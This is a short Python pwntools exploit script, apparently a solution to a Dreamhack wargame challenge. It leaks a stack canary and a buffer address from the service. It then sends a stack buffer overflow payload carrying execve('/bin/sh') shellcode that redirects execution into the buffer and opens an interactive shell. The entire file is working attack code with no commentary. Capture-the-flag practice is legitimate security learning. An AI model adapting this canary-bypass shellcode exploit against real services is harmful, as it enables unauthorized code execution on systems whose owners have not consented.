from pwn import *

port = 16979
rem = remote("host3.dreamhack.games", port)

rem.recvuntil(b"buf: ")
buf_address = rem.recvline().decode('utf-8')[: -1]

rem.recvuntil(b"rbp: ")
buf2sfp = int(rem.recvline().decode('utf-8'))

payload = b"A" * (buf2sfp - 7)
rem.sendafter(b"Input:", payload)
rem.recvuntil(payload)
canary = u64(b'\x00' + rem.recvn(7))

shellcode = b"\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
payload = shellcode.ljust(buf2sfp - 8, b"A")
payload += p64(canary)
payload += b'B' * 8
payload += p64(int(buf_address, 16))
rem.sendlineafter(b"Input:", payload)

rem.interactive()